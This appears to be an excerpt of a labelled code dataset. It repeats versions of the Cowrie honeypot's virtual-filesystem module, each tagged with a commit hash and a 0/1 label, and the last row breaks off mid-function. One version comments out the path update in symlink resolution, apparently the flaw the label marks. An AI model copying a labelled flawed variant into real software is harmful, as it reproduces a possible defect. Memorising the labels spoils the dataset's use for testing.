            # Zero-byte file lacking A_REALFILE backing: probably empty.
            # (The exceptions to this are some system files in /proc and /sys,
            # but it's likely better to return nothing than suspiciously fail.)
            return ''


    def mkfile(self, path, uid, gid, size, mode, ctime=None):
        """"""
        """"""
        if self.newcount > 10000:
            return False
        if ctime is None:
            ctime = time.time()
        dir = self.get_path(os.path.dirname(path))
        outfile = os.path.basename(path)
        if outfile in [x[A_NAME] for x in dir]:
            dir.remove([x for x in dir if x[A_NAME] == outfile][0])
        dir.append([outfile, T_FILE, uid, gid, size, mode, ctime, [],
            None, None])
        self.newcount += 1
        return True


    def mkdir(self, path, uid, gid, size, mode, ctime=None):
        """"""
        """"""
        if self.newcount > 10000:
            raise OSError(errno.EDQUOT, os.strerror(errno.EDQUOT), path)
        if ctime is None:
            ctime = time.time()
        if not len(path.strip('/')):
            raise OSError(errno.ENOENT, os.strerror(errno.ENOENT), path)
        try:
            dir = self.get_path(os.path.dirname(path.strip('/')))
        except IndexError:
            raise OSError(errno.ENOENT, os.strerror(errno.ENOENT), path)
            return False
        dir.append([os.path.basename(path), T_DIR, uid, gid, size, mode,
            ctime, [], None, None])
        self.newcount += 1


    def isfile(self, path):
        """"""
        Return True if path is an existing regular file. This follows symbolic
        links, so both islink() and isfile() can be true for the same path.
        """"""
        try:
            f = self.getfile(path)
        except:
            return False
        return f[A_TYPE] == T_FILE


    def islink(self, path):
        """"""
        Return True if path refers to a directory entry that is a symbolic
        link. Always False if symbolic links are not supported by the python
        runtime.
        """"""
        try:
            f = self.getfile(path)
        except:
            return False
        return f[A_TYPE] == T_LINK


    def isdir(self, path):
        """"""
        Return True if path is an existing directory.
        This follows symbolic links, so both islink() and isdir() can be true for the same path.
        """"""
        if path == '/':
            return True
        try:
            dir = self.getfile(path)
        except:
            dir = None
        if dir is None or dir is False:
            return False
        if dir[A_TYPE] == T_DIR:
            return True
        else:
            return False

    """"""
    Below additions for SFTP support, try to keep functions here similar to os.*
    """"""
    def open(self, filename, openFlags, mode):
        """"""
        #log.msg(""fs.open %s"" % filename)

        #if (openFlags & os.O_APPEND == os.O_APPEND):
        #    log.msg(""fs.open append"")

        #if (openFlags & os.O_CREAT == os.O_CREAT):
        #    log.msg(""fs.open creat"")

        #if (openFlags & os.O_TRUNC == os.O_TRUNC):
        #    log.msg(""fs.open trunc"")

        #if (openFlags & os.O_EXCL == os.O_EXCL):
        #    log.msg(""fs.open excl"")

        # treat O_RDWR same as O_WRONLY
        """"""
        if openFlags & os.O_WRONLY == os.O_WRONLY or openFlags & os.O_RDWR == os.O_RDWR:
            # strip executable bit
            hostmode = mode & ~(111)
            hostfile = '%s/%s_sftp_%s' % \
                       (self.cfg.get('honeypot', 'download_path'),
                    time.strftime('%Y%m%d-%H%M%S'),
                    re.sub('[^A-Za-z0-9]', '_', filename))
            #log.msg(""fs.open file for writing, saving to %s"" % safeoutfile)
            self.mkfile(filename, 0, 0, 0, stat.S_IFREG | mode)
            fd = os.open(hostfile, openFlags, hostmode)
            self.update_realfile(self.getfile(filename), hostfile)
            self.tempfiles[fd] = hostfile
            self.filenames[fd] = filename
            return fd

        elif openFlags & os.O_RDONLY == os.O_RDONLY:
            return None

        return None


    def read(self, fd, size):
        """"""
        """"""
        # this should not be called, we intercept at readChunk
        raise notImplementedError


    def write(self, fd, string):
        """"""
        """"""
        return os.write(fd, string)


    def close(self, fd):
        """"""
        """"""
        if not fd:
            return True
        if self.tempfiles[fd] is not None:
            shasum = hashlib.sha256(open(self.tempfiles[fd], 'rb').read()).hexdigest()
            shasumfile = self.cfg.get('honeypot', 'download_path') + ""/"" + shasum
            if (os.path.exists(shasumfile)):
                os.remove(self.tempfiles[fd])
            else:
                os.rename(self.tempfiles[fd], shasumfile)
            #os.symlink(shasum, self.tempfiles[fd])
            self.update_realfile(self.getfile(self.filenames[fd]), shasumfile)
            log.msg(format='SFTP Uploaded file \""%(filename)s\"" to %(outfile)s',
                    eventid='cowrie.session.file_upload',
                    filename=os.path.basename(self.filenames[fd]),
                    outfile=shasumfile,
                    shasum=shasum)
            del self.tempfiles[fd]
            del self.filenames[fd]
        return os.close(fd)


    def lseek(self, fd, offset, whence):
        """"""
        """"""
        if not fd:
            return True
        return os.lseek(fd, offset, whence)


    def mkdir2(self, path):
        """"""
        FIXME mkdir() name conflicts with existing mkdir
        """"""
        dir = self.getfile(path)
        if dir != False:
            raise OSError(errno.EEXIST, os.strerror(errno.EEXIST), path)
        self.mkdir(path, 0, 0, 4096, 16877)


    def rmdir(self, path):
        """"""
        """"""
        path = path.rstrip('/')
        name = os.path.basename(path)
        parent = os.path.dirname(path)
        dir = self.getfile(path, follow_symlinks=False)
        if dir == False:
            raise OSError(errno.EEXIST, os.strerror(errno.EEXIST), path)
        if dir[A_TYPE] != T_DIR:
            raise OSError(errno.ENOTDIR, os.strerror(errno.ENOTDIR), path)
        if len(self.get_path(path))>0:
            raise OSError(errno.ENOTEMPTY, os.strerror(errno.ENOTEMPTY), path)
        pdir = self.get_path(parent,follow_symlinks=True)
        for i in pdir[:]:
            if i[A_NAME] == name:
                pdir.remove(i)
                return True
        return False


    def utime(self, path, atime, mtime):
        """"""
        """"""
        p = self.getfile(path)
        if p == False:
            raise OSError(errno.ENOENT, os.strerror(errno.ENOENT))
        p[A_CTIME] = mtime


    def chmod(self, path, perm):
        """"""
        """"""
        p = self.getfile(path)
        if p == False:
            raise OSError(errno.ENOENT, os.strerror(errno.ENOENT))
        p[A_MODE] = stat.S_IFMT(p[A_MODE]) | perm


    def chown(self, path, uid, gid):
        """"""
        """"""
        p = self.getfile(path)
        if p == False:
            raise OSError(errno.ENOENT, os.strerror(errno.ENOENT))
        if (uid != -1):
            p[A_UID] = uid
        if (gid != -1):
            p[A_GID] = gid


    def remove(self, path):
        """"""
        """"""
        p = self.getfile(path, follow_symlinks=False)
        if p == False:
            raise OSError(errno.ENOENT, os.strerror(errno.ENOENT))
        self.get_path(os.path.dirname(path)).remove(p)
        return


    def readlink(self, path):
        """"""
        """"""
        p = self.getfile(path, follow_symlinks=False)
        if p == False:
            raise OSError(errno.ENOENT, os.strerror(errno.ENOENT))
        if not (p[A_MODE] & stat.S_IFLNK):
            raise OSError
        return p[A_TARGET]


    def symlink(self, targetPath, linkPath):
        """"""
        """"""
        raise notImplementedError


    def rename(self, oldpath, newpath):
        """"""
        """"""
        old = self.getfile(oldpath)
        if old == False:
            raise OSError(errno.ENOENT, os.strerror(errno.ENOENT))
        new = self.getfile(newpath)
        if new != False:
            raise OSError(errno.EEXIST, os.strerror(errno.EEXIST))

        self.get_path(os.path.dirname(oldpath)).remove(old)
        old[A_NAME] = os.path.basename(newpath)
        self.get_path(os.path.dirname(newpath)).append(old)
        return


    def listdir(self, path):
        """"""
        """"""
        names = [x[A_NAME] for x in self.get_path(path)]
        return names


    def lstat(self, path):
        """"""
        """"""
        return self.stat(path, follow_symlinks=False)


    def stat(self, path, follow_symlinks=True):
        """"""
        """"""
        if (path == ""/""):
            p = {A_TYPE:T_DIR, A_UID:0, A_GID:0, A_SIZE:4096, A_MODE:16877,
                A_CTIME:time.time()}
        else:
            p = self.getfile(path, follow_symlinks=follow_symlinks)

        if (p == False):
            raise OSError(errno.ENOENT, os.strerror(errno.ENOENT))

        return _statobj( p[A_MODE], 0, 0, 1, p[A_UID], p[A_GID], p[A_SIZE],
            p[A_CTIME], p[A_CTIME], p[A_CTIME])


    def realpath(self, path):
        """"""
        """"""
        return path


    def update_size(self, filename, size):
        """"""
        """"""
        f = self.getfile(filename)
        if f == False:
            return
        if f[A_TYPE] != T_FILE:
            return
        f[A_SIZE] = size



class _statobj(object):
    """"""
    Transform a tuple into a stat object
    """"""
    def __init__(self, st_mode, st_ino, st_dev, st_nlink, st_uid, st_gid, st_size, st_atime, st_mtime, st_ctime):
        self.st_mode = st_mode
        self.st_ino = st_ino
        self.st_dev = st_dev
        self.st_nlink = st_nlink
        self.st_uid = st_uid
        self.st_gid = st_gid
        self.st_size = st_size
        self.st_atime = st_atime
        self.st_mtime = st_mtime
        self.st_ctime = st_ctime

/n/n/n",0
157,cb2c5d4f654cc4709c3edc97ec7216c210901c78,"/cowrie/shell/fs.py/n/n# Copyright (c) 2009-2014 Upi Tamminen <desaster@gmail.com>
# See the COPYRIGHT file for more information

""""""
This module contains ...
""""""

from __future__ import division, absolute_import

try:
    import cPickle as pickle
except:
    import pickle

import os
import time
import fnmatch
import hashlib
import re
import stat
import errno

from twisted.python import log

from cowrie.core.config import CONFIG

PICKLE = pickle.load(open(CONFIG.get('honeypot', 'filesystem_file'), 'rb'))

A_NAME, \
    A_TYPE, \
    A_UID, \
    A_GID, \
    A_SIZE, \
    A_MODE, \
    A_CTIME, \
    A_CONTENTS, \
    A_TARGET, \
    A_REALFILE = list(range(0, 10))
T_LINK, \
    T_DIR, \
    T_FILE, \
    T_BLK, \
    T_CHR, \
    T_SOCK, \
    T_FIFO = list(range(0, 7))

class TooManyLevels(Exception):
    """"""
    62 ELOOP Too many levels of symbolic links.  A path name lookup involved more than 8 symbolic links.
    raise OSError(errno.ELOOP, os.strerror(errno.ENOENT))
    """"""
    pass



class FileNotFound(Exception):
    """"""
    raise OSError(errno.ENOENT, os.strerror(errno.ENOENT))
    """"""
    pass



class HoneyPotFilesystem(object):
    """"""
    """"""

    def __init__(self, fs, cfg):
        self.fs = fs
        self.cfg = cfg

        # Keep track of open file descriptors
        self.tempfiles = {}
        self.filenames = {}

        # Keep count of new files, so we can have an artificial limit
        self.newcount = 0

        # Get the honeyfs path from the config file and explore it for file
        # contents:
        self.init_honeyfs(self.cfg.get('honeypot', 'contents_path'))


    def init_honeyfs(self, honeyfs_path):
        """"""
        Explore the honeyfs at 'honeyfs_path' and set all A_REALFILE attributes on
        the virtual filesystem.
        """"""

        for path, directories, filenames in os.walk(honeyfs_path):
            for filename in filenames:
                realfile_path = os.path.join(path, filename)
                virtual_path = '/' + os.path.relpath(realfile_path, honeyfs_path)

                f = self.getfile(virtual_path, follow_symlinks=False)
                if f and f[A_TYPE] == T_FILE:
                    self.update_realfile(f, realfile_path)

    def resolve_path(self, path, cwd):
        """"""
        This function does not need to be in this class, it has no dependencies
        """"""
        pieces = path.rstrip('/').split('/')

        if path[0] == '/':
            cwd = []
        else:
            cwd = [x for x in cwd.split('/') if len(x) and x is not None]

        while 1:
            if not len(pieces):
                break
            piece = pieces.pop(0)
            if piece == '..':
                if len(cwd): cwd.pop()
                continue
            if piece in ('.', ''):
                continue
            cwd.append(piece)

        return '/%s' % ('/'.join(cwd),)


    def resolve_path_wc(self, path, cwd):
        """"""
        Resolve_path with wildcard support (globbing)
        """"""
        pieces = path.rstrip('/').split('/')
        if len(pieces[0]):
            cwd = [x for x in cwd.split('/') if len(x) and x is not None]
            path = path[1:]
        else:
            cwd, pieces = [], pieces[1:]
        found = []
        def foo(p, cwd):
            if not len(p):
                found.append('/%s' % ('/'.join(cwd),))
            elif p[0] == '.':
                foo(p[1:], cwd)
            elif p[0] == '..':
                foo(p[1:], cwd[:-1])
            else:
                names = [x[A_NAME] for x in self.get_path('/'.join(cwd))]
                matches = [x for x in names if fnmatch.fnmatchcase(x, p[0])]
                for match in matches:
                    foo(p[1:], cwd + [match])
        foo(pieces, cwd)
        return found


    def get_path(self, path, follow_symlinks=True):
        """"""
        This returns the Cowrie file system objects for a directory
        """"""
        cwd = self.fs
        for part in path.split('/'):
            if not len(part):
                continue
            ok = False
            for c in cwd[A_CONTENTS]:
                if c[A_NAME] == part:
                    if c[A_TYPE] == T_LINK:
                        cwd = self.getfile(c[A_TARGET],
                            follow_symlinks=follow_symlinks)
                    else:
                        cwd = c
                    ok = True
                    break
            if not ok:
                raise FileNotFound
        return cwd[A_CONTENTS]


    def exists(self, path):
        """"""
        Return True if path refers to an existing path.
        Returns False for broken symbolic links.
        """"""
        f = self.getfile(path, follow_symlinks=True)
        if f is not False:
            return True


    def lexists(self, path):
        """"""
        Return True if path refers to an existing path.
        Returns True for broken symbolic links.
        """"""
        f = self.getfile(path, follow_symlinks=False)
        if f is not False:
            return True


    def update_realfile(self, f, realfile):
        """"""
        """"""
        if not f[A_REALFILE] and os.path.exists(realfile) and \
                not os.path.islink(realfile) and os.path.isfile(realfile) and \
                f[A_SIZE] < 25000000:
            f[A_REALFILE] = realfile


    def getfile(self, path, follow_symlinks=True):
        """"""
        This returns the Cowrie file system object for a path
        """"""
        if path == '/':
            return self.fs
        pieces = path.strip('/').split('/')
        cwd = ''
        p = self.fs
        for piece in pieces:
            if piece not in [x[A_NAME] for x in p[A_CONTENTS]]:
                return False
            for x in p[A_CONTENTS]:
                if x[A_NAME] == piece:
                    if piece == pieces[-1] and follow_symlinks==False:
                        p = x
                    elif x[A_TYPE] == T_LINK:
                        if x[A_TARGET][0] == '/':
                            # Absolute link
                            p = self.getfile(x[A_TARGET],
                                follow_symlinks=follow_symlinks)
                        else:
                            # Relative link
                            p = self.getfile('/'.join((cwd, x[A_TARGET])),
                                follow_symlinks=follow_symlinks)
                        if p == False:
                            # Broken link
                            return False
                    else:
                        p = x
            cwd = '/'.join((cwd, piece))
        return p


    def file_contents(self, target):
        """"""
        Retrieve the content of a file in the honeyfs
        It follows links.
        It tries A_REALFILE first and then tries honeyfs directory
        """"""
        path = self.resolve_path(target, os.path.dirname(target))
        if not path or not self.exists(path):
            raise FileNotFound
        f = self.getfile(path)
        if f[A_TYPE] == T_DIR:
            raise IsADirectoryError
        elif f[A_TYPE] == T_FILE and f[A_REALFILE]:
            return open(f[A_REALFILE], 'rb').read()
        elif f[A_TYPE] == T_FILE and f[A_SIZE] == 0:
            # Zero-byte file lacking A_REALFILE backing: probably empty.
            # (The exceptions to this are some system files in /proc and /sys,
            # but it's likely better to return nothing than suspiciously fail.)
            return ''


    def mkfile(self, path, uid, gid, size, mode, ctime=None):
        """"""
        """"""
        if self.newcount > 10000:
            return False
        if ctime is None:
            ctime = time.time()
        dir = self.get_path(os.path.dirname(path))
        outfile = os.path.basename(path)
        if outfile in [x[A_NAME] for x in dir]:
            dir.remove([x for x in dir if x[A_NAME] == outfile][0])
        dir.append([outfile, T_FILE, uid, gid, size, mode, ctime, [],
            None, None])
        self.newcount += 1
        return True


    def mkdir(self, path, uid, gid, size, mode, ctime=None):
        """"""
        """"""
        if self.newcount > 10000:
            raise OSError(errno.EDQUOT, os.strerror(errno.EDQUOT), path)
        if ctime is None:
            ctime = time.time()
        if not len(path.strip('/')):
            raise OSError(errno.ENOENT, os.strerror(errno.ENOENT), path)
        try:
            dir = self.get_path(os.path.dirname(path.strip('/')))
        except IndexError:
            raise OSError(errno.ENOENT, os.strerror(errno.ENOENT), path)
            return False
        dir.append([os.path.basename(path), T_DIR, uid, gid, size, mode,
            ctime, [], None, None])
        self.newcount += 1


    def isfile(self, path):
        """"""
        Return True if path is an existing regular file. This follows symbolic
        links, so both islink() and isfile() can be true for the same path.
        """"""
        try:
            f = self.getfile(path)
        except:
            return False
        return f[A_TYPE] == T_FILE


    def islink(self, path):
        """"""
        Return True if path refers to a directory entry that is a symbolic
        link. Always False if symbolic links are not supported by the python
        runtime.
        """"""
        try:
            f = self.getfile(path)
        except:
            return False
        return f[A_TYPE] == T_LINK


    def isdir(self, path):
        """"""
        Return True if path is an existing directory.
        This follows symbolic links, so both islink() and isdir() can be true for the same path.
        """"""
        if path == '/':
            return True
        try:
            dir = self.getfile(path)
        except:
            dir = None
        if dir is None or dir is False:
            return False
        if dir[A_TYPE] == T_DIR:
            return True
        else:
            return False

    """"""
    Below additions for SFTP support, try to keep functions here similar to os.*
    """"""
    def open(self, filename, openFlags, mode):
        """"""
        #log.msg(""fs.open %s"" % filename)

        #if (openFlags & os.O_APPEND == os.O_APPEND):
        #    log.msg(""fs.open append"")

        #if (openFlags & os.O_CREAT == os.O_CREAT):
        #    log.msg(""fs.open creat"")

        #if (openFlags & os.O_TRUNC == os.O_TRUNC):
        #    log.msg(""fs.open trunc"")

        #if (openFlags & os.O_EXCL == os.O_EXCL):
        #    log.msg(""fs.open excl"")

        # treat O_RDWR same as O_WRONLY
        """"""
        if openFlags & os.O_WRONLY == os.O_WRONLY or openFlags & os.O_RDWR == os.O_RDWR:
            # strip executable bit
            hostmode = mode & ~(111)
            hostfile = '%s/%s_sftp_%s' % \
                       (self.cfg.get('honeypot', 'download_path'),
                    time.strftime('%Y%m%d-%H%M%S'),
                    re.sub('[^A-Za-z0-9]', '_', filename))
            #log.msg(""fs.open file for writing, saving to %s"" % safeoutfile)
            self.mkfile(filename, 0, 0, 0, stat.S_IFREG | mode)
            fd = os.open(hostfile, openFlags, hostmode)
            self.update_realfile(self.getfile(filename), hostfile)
            self.tempfiles[fd] = hostfile
            self.filenames[fd] = filename
            return fd

        elif openFlags & os.O_RDONLY == os.O_RDONLY:
            return None

        return None


    def read(self, fd, size):
        """"""
        """"""
        # this should not be called, we intercept at readChunk
        raise notImplementedError


    def write(self, fd, string):
        """"""
        """"""
        return os.write(fd, string)


    def close(self, fd):
        """"""
        """"""
        if not fd:
            return True
        if self.tempfiles[fd] is not None:
            shasum = hashlib.sha256(open(self.tempfiles[fd], 'rb').read()).hexdigest()
            shasumfile = self.cfg.get('honeypot', 'download_path') + ""/"" + shasum
            if (os.path.exists(shasumfile)):
                os.remove(self.tempfiles[fd])
            else:
                os.rename(self.tempfiles[fd], shasumfile)
            #os.symlink(shasum, self.tempfiles[fd])
            self.update_realfile(self.getfile(self.filenames[fd]), shasumfile)
            log.msg(format='SFTP Uploaded file \""%(filename)s\"" to %(outfile)s',
                    eventid='cowrie.session.file_upload',
                    filename=os.path.basename(self.filenames[fd]),
                    outfile=shasumfile,
                    shasum=shasum)
            del self.tempfiles[fd]
            del self.filenames[fd]
        return os.close(fd)


    def lseek(self, fd, offset, whence):
        """"""
        """"""
        if not fd:
            return True
        return os.lseek(fd, offset, whence)


    def mkdir2(self, path):
        """"""
        FIXME mkdir() name conflicts with existing mkdir
        """"""
        dir = self.getfile(path)
        if dir != False:
            raise OSError(errno.EEXIST, os.strerror(errno.EEXIST), path)
        self.mkdir(path, 0, 0, 4096, 16877)


    def rmdir(self, path):
        """"""
        """"""
        path = path.rstrip('/')
        name = os.path.basename(path)
        parent = os.path.dirname(path)
        dir = self.getfile(path, follow_symlinks=False)
        if dir == False:
            raise OSError(errno.EEXIST, os.strerror(errno.EEXIST), path)
        if dir[A_TYPE] != T_DIR:
            raise OSError(errno.ENOTDIR, os.strerror(errno.ENOTDIR), path)
        if len(self.get_path(path))>0:
            raise OSError(errno.ENOTEMPTY, os.strerror(errno.ENOTEMPTY), path)
        pdir = self.get_path(parent,follow_symlinks=True)
        for i in pdir[:]:
            if i[A_NAME] == name:
                pdir.remove(i)
                return True
        return False


    def utime(self, path, atime, mtime):
        """"""
        """"""
        p = self.getfile(path)
        if p == False:
            raise OSError(errno.ENOENT, os.strerror(errno.ENOENT))
        p[A_CTIME] = mtime


    def chmod(self, path, perm):
        """"""
        """"""
        p = self.getfile(path)
        if p == False:
            raise OSError(errno.ENOENT, os.strerror(errno.ENOENT))
        p[A_MODE] = stat.S_IFMT(p[A_MODE]) | perm


    def chown(self, path, uid, gid):
        """"""
        """"""
        p = self.getfile(path)
        if p == False:
            raise OSError(errno.ENOENT, os.strerror(errno.ENOENT))
        if (uid != -1):
            p[A_UID] = uid
        if (gid != -1):
            p[A_GID] = gid


    def remove(self, path):
        """"""
        """"""
        p = self.getfile(path, follow_symlinks=False)
        if p == False:
            raise OSError(errno.ENOENT, os.strerror(errno.ENOENT))
        self.get_path(os.path.dirname(path)).remove(p)
        return


    def readlink(self, path):
        """"""
        """"""
        p = self.getfile(path, follow_symlinks=False)
        if p == False:
            raise OSError(errno.ENOENT, os.strerror(errno.ENOENT))
        if not (p[A_MODE] & stat.S_IFLNK):
            raise OSError
        return p[A_TARGET]


    def symlink(self, targetPath, linkPath):
        """"""
        """"""
        raise notImplementedError


    def rename(self, oldpath, newpath):
        """"""
        """"""
        old = self.getfile(oldpath)
        if old == False:
            raise OSError(errno.ENOENT, os.strerror(errno.ENOENT))
        new = self.getfile(newpath)
        if new != False:
            raise OSError(errno.EEXIST, os.strerror(errno.EEXIST))

        self.get_path(os.path.dirname(oldpath)).remove(old)
        old[A_NAME] = os.path.basename(newpath)
        self.get_path(os.path.dirname(newpath)).append(old)
        return


    def listdir(self, path):
        """"""
        """"""
        names = [x[A_NAME] for x in self.get_path(path)]
        return names


    def lstat(self, path):
        """"""
        """"""
        return self.stat(path, follow_symlinks=False)


    def stat(self, path, follow_symlinks=True):
        """"""
        """"""
        if (path == ""/""):
            p = {A_TYPE:T_DIR, A_UID:0, A_GID:0, A_SIZE:4096, A_MODE:16877,
                A_CTIME:time.time()}
        else:
            p = self.getfile(path, follow_symlinks=follow_symlinks)

        if (p == False):
            raise OSError(errno.ENOENT, os.strerror(errno.ENOENT))

        return _statobj( p[A_MODE], 0, 0, 1, p[A_UID], p[A_GID], p[A_SIZE],
            p[A_CTIME], p[A_CTIME], p[A_CTIME])


    def realpath(self, path):
        """"""
        """"""
        return path


    def update_size(self, filename, size):
        """"""
        """"""
        f = self.getfile(filename)
        if f == False:
            return
        if f[A_TYPE] != T_FILE:
            return
        f[A_SIZE] = size



class _statobj(object):
    """"""
    Transform a tuple into a stat object
    """"""
    def __init__(self, st_mode, st_ino, st_dev, st_nlink, st_uid, st_gid, st_size, st_atime, st_mtime, st_ctime):
        self.st_mode = st_mode
        self.st_ino = st_ino
        self.st_dev = st_dev
        self.st_nlink = st_nlink
        self.st_uid = st_uid
        self.st_gid = st_gid
        self.st_size = st_size
        self.st_atime = st_atime
        self.st_mtime = st_mtime
        self.st_ctime = st_ctime

/n/n/n",1
158,cb2c5d4f654cc4709c3edc97ec7216c210901c78,"cowrie/shell/fs.py/n/n# Copyright (c) 2009-2014 Upi Tamminen <desaster@gmail.com>
# See the COPYRIGHT file for more information

""""""
This module contains ...
""""""

from __future__ import division, absolute_import

try:
    import cPickle as pickle
except:
    import pickle

import os
import time
import fnmatch
import hashlib
import re
import stat
import errno

from twisted.python import log

from cowrie.core.config import CONFIG

PICKLE = pickle.load(open(CONFIG.get('honeypot', 'filesystem_file'), 'rb'))

A_NAME, \
    A_TYPE, \
    A_UID, \
    A_GID, \
    A_SIZE, \
    A_MODE, \
    A_CTIME, \
    A_CONTENTS, \
    A_TARGET, \
    A_REALFILE = list(range(0, 10))
T_LINK, \
    T_DIR, \
    T_FILE, \
    T_BLK, \
    T_CHR, \
    T_SOCK, \
    T_FIFO = list(range(0, 7))

class TooManyLevels(Exception):
    """"""
    62 ELOOP Too many levels of symbolic links.  A path name lookup involved more than 8 symbolic links.
    raise OSError(errno.ELOOP, os.strerror(errno.ENOENT))
    """"""
    pass



class FileNotFound(Exception):
    """"""
    raise OSError(errno.ENOENT, os.strerror(errno.ENOENT))
    """"""
    pass



class HoneyPotFilesystem(object):
    """"""
    """"""

    def __init__(self, fs, cfg):
        self.fs = fs
        self.cfg = cfg

        # Keep track of open file descriptors
        self.tempfiles = {}
        self.filenames = {}

        # Keep count of new files, so we can have an artificial limit
        self.newcount = 0

        # Get the honeyfs path from the config file and explore it for file
        # contents:
        self.init_honeyfs(self.cfg.get('honeypot', 'contents_path'))


    def init_honeyfs(self, honeyfs_path):
        """"""
        Explore the honeyfs at 'honeyfs_path' and set all A_REALFILE attributes on
        the virtual filesystem.
        """"""

        for path, directories, filenames in os.walk(honeyfs_path):
            for filename in filenames:
                realfile_path = os.path.join(path, filename)
                virtual_path = '/' + os.path.relpath(realfile_path, honeyfs_path)

                f = self.getfile(virtual_path, follow_symlinks=False)
                if f and f[A_TYPE] == T_FILE:
                    self.update_realfile(f, realfile_path)

    def resolve_path(self, path, cwd):
        """"""
        This function does not need to be in this class, it has no dependencies
        """"""
        pieces = path.rstrip('/').split('/')

        if path[0] == '/':
            cwd = []
        else:
            cwd = [x for x in cwd.split('/') if len(x) and x is not None]

        while 1:
            if not len(pieces):
                break
            piece = pieces.pop(0)
            if piece == '..':
                if len(cwd): cwd.pop()
                continue
            if piece in ('.', ''):
                continue
            cwd.append(piece)

        return '/%s' % ('/'.join(cwd),)


    def resolve_path_wc(self, path, cwd):
        """"""
        Resolve_path with wildcard support (globbing)
        """"""
        pieces = path.rstrip('/').split('/')
        if len(pieces[0]):
            cwd = [x for x in cwd.split('/') if len(x) and x is not None]
            path = path[1:]
        else:
            cwd, pieces = [], pieces[1:]
        found = []
        def foo(p, cwd):
            if not len(p):
                found.append('/%s' % ('/'.join(cwd),))
            elif p[0] == '.':
                foo(p[1:], cwd)
            elif p[0] == '..':
                foo(p[1:], cwd[:-1])
            else:
                names = [x[A_NAME] for x in self.get_path('/'.join(cwd))]
                matches = [x for x in names if fnmatch.fnmatchcase(x, p[0])]
                for match in matches:
                    foo(p[1:], cwd + [match])
        foo(pieces, cwd)
        return found


    def get_path(self, path, follow_symlinks=True):
        """"""
        This returns the Cowrie file system objects for a directory
        """"""
        cwd = self.fs
        for part in path.split('/'):
            if not len(part):
                continue
            ok = False
            for c in cwd[A_CONTENTS]:
                if c[A_NAME] == part:
                    if c[A_TYPE] == T_LINK:
                        cwd = self.getfile(c[A_TARGET],
                            follow_symlinks=follow_symlinks)
                    else:
                        cwd = c
                    ok = True
                    break
            if not ok:
                raise FileNotFound
        return cwd[A_CONTENTS]


    def exists(self, path):
        """"""
        Return True if path refers to an existing path.
        Returns False for broken symbolic links.
        """"""
        f = self.getfile(path, follow_symlinks=True)
        if f is not False:
            return True


    def lexists(self, path):
        """"""
        Return True if path refers to an existing path.
        Returns True for broken symbolic links.
        """"""
        f = self.getfile(path, follow_symlinks=False)
        if f is not False:
            return True


    def update_realfile(self, f, realfile):
        """"""
        """"""
        if not f[A_REALFILE] and os.path.exists(realfile) and \
                not os.path.islink(realfile) and os.path.isfile(realfile) and \
                f[A_SIZE] < 25000000:
            f[A_REALFILE] = realfile


    def getfile(self, path, follow_symlinks=True):
        """"""
        This returns the Cowrie file system object for a path
        """"""
        if path == '/':
            return self.fs
        pieces = path.strip('/').split('/')
        cwd = ''
        p = self.fs
        for piece in pieces:
            if piece not in [x[A_NAME] for x in p[A_CONTENTS]]:
                return False
            for x in p[A_CONTENTS]:
                if x[A_NAME] == piece:
                    if piece == pieces[-1] and follow_symlinks==False:
                        p = x
                    elif x[A_TYPE] == T_LINK:
                        if x[A_TARGET][0] == '/':
                            # Absolute link
                            p = self.getfile(x[A_TARGET],
                                follow_symlinks=follow_symlinks)
                        else:
                            # Relative link
                            p = self.getfile('/'.join((cwd, x[A_TARGET])),
                                follow_symlinks=follow_symlinks)
                        if p == False:
                            # Broken link
                            return False
                    else:
                        p = x
            # cwd = '/'.join((cwd, piece))
        return p


    def file_contents(self, target):
        """"""
        Retrieve the content of a file in the honeyfs
        It follows links.
        It tries A_REALFILE first and then tries honeyfs directory
        """"""
        path = self.resolve_path(target, os.path.dirname(target))
        if not path or not self.exists(path):
            raise FileNotFound
        f = self.getfile(path)
        if f[A_TYPE] == T_DIR:
            raise IsADirectoryError
        elif f[A_TYPE] == T_FILE and f[A_REALFILE]:
            return open(f[A_REALFILE], 'rb').read()
        elif f[A_TYPE] == T_FILE and f[A_SIZE] == 0:
            # Zero-byte file lacking A_REALFILE backing: probably empty.
            # (The exceptions to this are some system files in /proc and /sys,
            # but it's likely better to return nothing than suspiciously fail.)
            return ''


    def mkfile(self, path, uid, gid, size, mode, ctime=None):
        """"""
        """"""
        if self.newcount > 10000:
            return False
        if ctime is None:
            ctime = time.time()
        dir = self.get_path(os.path.dirname(path))
        outfile = os.path.basename(path)
        if outfile in [x[A_NAME] for x in dir]:
            dir.remove([x for x in dir if x[A_NAME] == outfile][0])
        dir.append([outfile, T_FILE, uid, gid, size, mode, ctime, [],
            None, None])
        self.newcount += 1
        return True


    def mkdir(self, path, uid, gid, size, mode, ctime=None):
        """"""
        """"""
        if self.newcount > 10000:
            raise OSError(errno.EDQUOT, os.strerror(errno.EDQUOT), path)
        if ctime is None:
            ctime = time.time()
        if not len(path.strip('/')):
            raise OSError(errno.ENOENT, os.strerror(errno.ENOENT), path)
        try:
            dir = self.get_path(os.path.dirname(path.strip('/')))
        except IndexError:
            raise OSError(errno.ENOENT, os.strerror(errno.ENOENT), path)
            return False
        dir.append([os.path.basename(path), T_DIR, uid, gid, size, mode,
            ctime, [], None, None])
        self.newcount += 1


    def isfile(self, path):
        """"""
        Return True if path is an existing regular file. This follows symbolic
        links, so both islink() and isfile() can be true for the same path.
        """"""
        try:
            f = self.getfile(path)
        except:
            return False
        return f[A_TYPE] == T_FILE


    def islink(self, path):
        """"""
        Return True if path refers to a directory entry that is a symbolic
        link. Always False if symbolic links are not supported by the python
        runtime.
        """"""
        try:
            f = self.getfile(path)
        except:
            return False
        return f[A_TYPE] == T_LINK


    def isdir(self, path):
        """"""
        Return True if path is an existing directory.
        This follows symbolic links, so both islink() and isdir() can be true for the same path.
        """"""
        if path == '/':
            return True
        try:
            dir = self.getfile(path)
        except:
            dir = None
        if dir is None or dir is False:
            return False
        if dir[A_TYPE] == T_DIR:
            return True
        else:
            return False

    """"""
    Below additions for SFTP support, try to keep functions here similar to os.*
    """"""
    def open(self, filename, openFlags, mode):
        """"""
        #log.msg(""fs.open %s"" % filename)

        #if (openFlags & os.O_APPEND == os.O_APPEND):
        #    log.msg(""fs.open append"")

        #if (openFlags & os.O_CREAT == os.O_CREAT):
        #    log.msg(""fs.open creat"")

        #if (openFlags & os.O_TRUNC == os.O_TRUNC):
        #    log.msg(""fs.open trunc"")

        #if (openFlags & os.O_EXCL == os.O_EXCL):
        #    log.msg(""fs.open excl"")

        # treat O_RDWR same as O_WRONLY
        """"""
